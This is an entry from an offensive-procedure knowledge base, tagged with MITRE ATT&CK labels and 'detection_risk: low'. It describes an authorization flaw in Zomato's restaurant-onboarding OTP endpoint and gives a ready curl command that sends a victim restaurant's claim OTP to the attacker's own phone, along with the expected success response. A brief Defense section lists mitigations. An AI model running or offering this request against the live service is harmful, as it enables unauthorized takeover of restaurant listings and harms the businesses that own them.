---
tags:
  - otp-manipulation
  - api-exploit
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-otp-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:44.236Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 7a11b09d-609a-4f12-ba4e-41c6fc3b2850
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---

# Send-OTP-Request-with-Arbitrary-Phone-Number

## Summary

This procedure exploits the lack of validation in Zomato's OTP sending endpoint to request an OTP for a target restaurant using the attacker's arbitrary phone number, allowing OTP interception.

## Description

The /restaurant-onboard-diy/v2/send-auto-claim-otp endpoint accepts a phone number, ISD code, and restaurant ID (resId) without verifying if the phone is associated with the resId. This enables attackers to receive OTPs for unclaimed restaurants on their own device, setting up unauthorized verification. The attack targets non-delivery restaurants and requires the attacker to have a Zomato account with an existing mapped restaurant for later claiming.

## Requirements

1. Access to Zomato API (public, no auth needed for this endpoint)
2. Valid target resId for an unclaimed restaurant (obtainable via Zomato search or API)
3. Attacker's phone number in international format (e.g., +91 for India)
4. Tool like curl for HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement server-side validation to ensure phone numbers are pre-registered or linked to the resId
- Rate-limit OTP requests per resId and phone number
- Log and monitor anomalous OTP requests (e.g., mismatched phone-resId pairs)
- Use CAPTCHA or additional auth for onboarding endpoints

## Objectives

1. Initiate OTP delivery to attacker's controlled phone for target resId
2. Obtain a requestId for subsequent verification
3. Bypass authorization checks for OTP sending

## Instructions

### Step 1: Prepare Payload

**Context**: Construct the JSON payload with attacker's phone details and victim's resId to trick the endpoint into sending OTP to the attacker.

**Command** ([[commands/curl-send-otp-request]]):
```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/send-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"number": "ATTACKER_PHONE", "isdCode": "+91", "resId": "VICTIM_RESID"}'
```

> This sends a POST request over HTTP/2. Replace ATTACKER_PHONE with a 10-digit number (e.g., "9876543210") and VICTIM_RESID with the target ID (e.g., "123456"). Expected output: {"status":"success","requestId":"abc123","message":"OTP sent"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-send-otp-request]]

## Tools Used

- [[tools/curl]]

## Tags

- otp-manipulation
- api-vulnerability
- authorization-bypass

---
